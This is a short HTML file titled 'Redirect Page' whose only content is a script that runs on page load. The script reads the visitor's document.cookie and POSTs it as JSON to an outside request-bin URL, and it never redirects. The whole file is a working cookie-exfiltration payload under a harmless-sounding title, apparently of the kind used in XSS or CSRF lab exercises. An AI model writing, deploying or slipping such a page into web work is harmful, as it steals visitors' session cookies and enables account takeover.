<!DOCTYPE html>
<html>
<head>
    <title>Redirect Page</title>
</head>
<body>
<script>
    window.onload = () => {
        const headers = new Headers();
        headers.append("Content-Type", "application/json");

        const body = JSON.stringify({
            cookies: document.cookie
        });

        const options = {
            method: "POST",
            headers,
            mode: "cors",
            body: body
        };

        fetch("https://requestbin.kanbanbox.com/1mazijq1", options);
    }
</script>
</body>
</html>
